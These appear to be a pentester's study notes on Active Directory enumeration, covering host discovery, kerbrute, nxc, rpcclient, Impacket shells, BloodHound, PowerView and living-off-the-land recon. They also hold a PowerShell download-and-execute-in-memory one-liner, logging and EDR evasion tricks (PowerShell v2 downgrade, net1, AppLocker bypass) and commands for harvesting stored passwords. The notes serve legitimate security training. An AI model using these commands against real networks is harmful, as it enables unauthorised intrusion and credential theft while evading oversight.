## Initial enumeration
#### passive host discovery

##### tcpdump
the following command tells `tcpdump` to listen on `eth0` interface and write the data to `file.pcap` for later analysis using `wireshark` 
```shell
sudo tcpdump -i eth0 -w file.pcap
```

##### pktmon.exe
if you are on a Windows host you may find `pktmon.exe`, which is a packet monitoring tool native to windows 10. First you need to capture some traffic and store it in a file, and then you can convert the file form etl to pcap `REQUIRES ADMIN PRIVILAGES`:
```powershell
ipconfig /all

pktmon list

pktmon start -c --comp <id> --pkt-size 0 -s 100 -f cap.etl

pktmon etl2pcap cap.etl --out cap.pcap
```

##### responder
```shell
sudo responder -I eth0 -A 
```
--- 
#### active host discovery
##### fping
we can use `fping` to send ICMP packets to a list of hosts instead of one:
```shell
fping -asgq <CIDR>
```

- -a show live targets
- -s print status
- -g generate a target list from CIDR
- -q don't show per-target results

##### nmap
no introduction needed... more on [[Nmap|Nmap Tool notes]]
```shell
sudo nmap -v -A -iL hosts.txt -oN portscan.nmap
```
---
### Identifying Users
We can enumerate users using [kerbrute](https://github.com/ropnop/kerbrute) :
```shell
kerbrute userenum -d <DOMAIN> --dc <DC_IP> user_list -o output_list
```
This is a good approach to enumerate users as `kerbrute` sends one UDP frame to the KDC and unless kerberos logging is enabled, there won't be any logs of your requests.

---
# post-foothold enumeration

### Enumerating Security Controls

#### Windows Defender
We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. If `RealTimeProtectionEnabled` parameter is set to `True`, that means Defender is enabled on the system.

#### App Locker
App locker is a whitelisting solution by microslop, it is used to provide granular control over executables. Some times the blacklisting set with App Locker is trivial like blocking the `%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\PowerShell.exe`, in that case we can simply run `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. but sometimes the protection requires more creativity.

#### PowerShell Constrained Language Mode
PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.

```
PS C:\htb> $ExecutionContext.SessionState.LanguageMode
 ConstrainedLanguage
```

#### LAPS
The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can use the `LAPSToolkit` to enumerate domain users that can read the LAPS password set for machines with LAPS installed, and what machines don't have LAPS.

```powershell
PS C:\htb> Find-LAPSDelegatedGroups
```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

```powershell
PS C:\htb> Find-AdmPwdExtendedRights
```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

```powershell
PS C:\htb> Get-LAPSComputers
```

---
### Credentialed Enumeration - from Linux
We'll be using six tools, most of them I've covered in other sections so I will just put the commands:
#### nxc
get domain users
```shell
nxc smb <DC_IP> -u "" -p "" --users 
```

get domain groups
```shell
nxc smb <DC_IP> -u "" -p "" --groups
```

get logged on users
```shell
nxc smb <DC_IP> -u "" -p "" --loggedon-users
```

get SMB shares
```shell
nxc smb <DC_IP> -u "" -p "" --shares
```

recursively get files inside shares
```shell
nxc smb <DC_IP> -u "" -p "" --share '<SHARE>' -M spider_plus
```

#### SMBMap
check access to shares
```shell
smbmap -u "" -p "" -d <DOMAIN> -H <IP>
```

recursive list of files inside shares
```shell
smbmap -u "" -p "" -d <DOMAIN> -H <IP> -r '<SHARE>' 
```

---
#### rpcclient

start a NULL session
```shell
rpcclient -U "" -N <IP>
```

get all users in domain
```shell
rpcclient $> enumdomusers
```

get more information about a user
```shell
rpcclient $> queryuser <RID>
```

#### Impacket Toolkit
Using psexec.py to get a SYSTEM shell
```shelll
psexec.py <DOMAIN>/<USER>:'<PASSWORD>'@<IP>
```

Using wmiexec.py to get a non-interactive shell on the system (This is more stealthy)
```shell
wmiexec.py <DOMAIN>/<USER>:'<PASSWORD>'@<IP>
```

---
#### Windapsearch
[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a domain by utilizing LDAP queries.

get domain admins
```shell
python3 windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASS> --da
```

get privileged users
```shell
python3 windapsearch.py --dc-ip <IP> -u <USER>@<DOMAIN> -p <PASS> -PU
```

#### Bloodhound.py
there is also the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) for Windows. we collect information using `bloodhound-python` then zip all of it, then use `bloodhound` GUI to view the graph.

collect all information about the domain
```shell
sudo bloodhound-python -u '<USER>' -p '<PASS>' -ns <IP> -d <DOMAIN> -c all
```

zip all the output to give it to bloodhound GUI
```shell
zip -r bloodhound.zip *.json
```

start neo4j
```shell
sudo neo4j start
```

start bloodhound GUI
```shell
bloodhound
```

---
### Credentialed Enumeration - from Windows

#### ActiveDirectory PowerShell Module
This can be a stealthier way of enumerating AD

get all loaded modules to powershell
```powershell
Get-Module
```

load the Active Directory module. View all cmdlets in the [docs](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
```powershell
Import-Module ActiveDirectory
```

get domain info
```powershell
Get-ADDomain
```

get all users that have the SPN (ServicePrincipalName) attribute set, these might be susceptible to a Kerberoasting attack
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName 
```

get trust relationships
```powershell
Get-ADTrust -Filter *
```

group enumeration
```powershell
Get-ADGroup -Filter * | select name
```

get detailed group info
```powershell
Get-ADGroup -Identity "Backup Operators"
```

get group membership
```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

#### PowerView
You can view the [docs](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) for more information

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

get domain user information
```powershell
Get-DomainUser -Identity mmorgan -Domain <DOMAIN> | Select-Object -Property
```

recursive group membership
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

trust enumeration
```powershell
Get-DomainTrustMapping
```

testing for admin access on a computer in the domain
```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

finding users with PSN set
```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

#### SharpView
docs : [Empire](https://github.com/BC-SECURITY/Empire/tree/main)
sharpview is the modern and maintained version of PowerView and is part of [Empire 4](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1), it do almost all of what PowerView does plus some other new functions like `Get-NetGmsa` used to hut for [Group Managed Service Accounts](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)

#### Snaffler
Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.

example of `Snaffler.exe` execution. Specifying the domain `-d` and output file `-o` and verbosity type `-v data`
```powershell
Snaffler.exe -s -d <DOMAIN> -o snaffler.log -v data
```

#### BloodHound

I've covered bloodhound in the Linux section, also when I take the module I'll link the notes here

collect all information and output a zip archive
```powershell
.\SharpHound.exe -c All --zipfilename <FILENAME>
```

start bloodhound GUI 
```powershell
.\bloodhound.exe
```

then click on `upload data` and upload the zip file.

---
### Living Off the Land
When living of the land that means we don't have access to the internet to get our tools, or the firewall rules are so strict that it is near impossible to run these tools. In that case we live of the land...


#### Env Commands For Host & Network Recon

First, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on. We can run `systeminfo` to get a summery of the host information, in case `systeminfo` doesn't work, we can use the following commands 

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

---
#### Harnessing PowerShell
We can use PowerShell which has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |

>[!Tip]
>several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer.

```powershell
Get-host 
Name : ConsoleHost Version : 5.1.19041.1320


powershell.exe -version 2 

Get-host 
Name : ConsoleHost Version : 2.0
```

---
#### Checking Defenses

We can check the firewall status using `netsh` on `powershell.exe` and `sc` on `cmd.exe`

checking the firewall in PowerShell using `netsh`
```powershell
netsh advfirewall show allprofiles
```

checking the firewall in PowerShell using `Get-MpComputerStatus`
```powershell
Get-MpComputerStatus
```

checking the firewall in cmd
```cmd
sc query windefend
```

---
#### checking logged on users
if there is a logged on user, they might notice us in case there is a pop up window or they get logged out. We can use `qwinsta` to check for logged in users. Just like `w` in linux
```powershell
qwinsta
```

---
#### Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

>[!note]
>Using `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

#### Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts. This is another [Cheat Sheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

##### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |


#### Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. This could be an obvious red flag to anyone monitoring the network heavily.

#### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|

>[!Trick]
>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

#### Dsquery
docs: [official microsoft docs]([Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)))

Note that you need the `SYSTEM` privileges before using `dsquery`

get all users in the domain
```powershell
dsquery user
```

get all computers in the domain
```powershell
dsquery computer
```

use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232\(v=ws.11\)) to view all objects in an OU
```powershell
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.
```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

look for all Domain Controllers in the current domain, limiting to five results.
```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

